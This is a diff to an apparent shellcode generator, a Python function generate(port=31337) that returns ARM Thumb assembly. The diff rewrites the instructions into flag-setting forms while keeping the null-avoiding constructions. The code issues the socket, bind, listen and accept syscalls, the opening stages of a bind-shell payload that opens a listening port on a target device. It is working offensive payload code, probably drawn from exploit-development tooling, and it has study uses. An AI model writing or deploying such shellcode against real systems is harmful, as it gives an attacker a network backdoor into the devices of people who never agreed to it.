@@ -13,30 +13,29 @@ def generate(port=31337):
     """
     sc = """
     /* socket(AF_INET, SOCK_STREAM, ...) */
-    mov r0, #2
-    mov r1, #1
-    sub r2, r2, r2
-    sub r7, r7, r7
-    add r7, r7, #255
-    add r7, r7, #26
+    movs r0, #2
+    movs r1, #1
+    subs r2, r2, r2
+    subs r7, r7, r7
+    adds r7, r7, #255
+    adds r7, r7, #26
     svc 1
 
     /* backup socket descriptor r6 
        bind(...)
     */
-    mov r6, r0
-    #adr r4, sockaddr_in_1
+    movs r6, r0
     mov r4, pc
-    add r4, #22
+    adds r4, #22
     ldr r1, [r4]
-    sub r2, r2, r2
+    subs r2, r2, r2
     push { r1, r2 }
     mov r0, r6
     mov r1, sp
-    mov r2, #16
-    sub r7, r7, r7
-    add r7, r7, #255
-    add r7, r7, #27
+    movs r2, #16
+    subs r7, r7, r7
+    adds r7, r7, #255
+    adds r7, r7, #27
     svc 1
 
     b after_sockaddr_in_2
@@ -48,20 +47,20 @@ sockaddr_in_1:
 
     /* listen(...) */
 after_sockaddr_in_2:
-    mov r1, #16
+    movs r1, #16
     mov r0, r6
-    sub r7, r7, r7
-    add r7, r7, #255
-    add r7, r7, #29
+    subs r7, r7, r7
+    adds r7, r7, #255
+    adds r7, r7, #29
     svc 1
 
     /* accept(...) */
     mov r0, r6
-    sub r1, r1, r1
-    sub r2, r2, r2
-    sub r7, r7, r7
-    add r7, r7, #255
-    add r7, r7, #30
+    subs r1, r1, r1
+    subs r2, r2, r2
+    subs r7, r7, r7
+    adds r7, r7, #255
+    adds r7, r7, #30
     svc 1
     """ % (ntohs(port))
     return sc
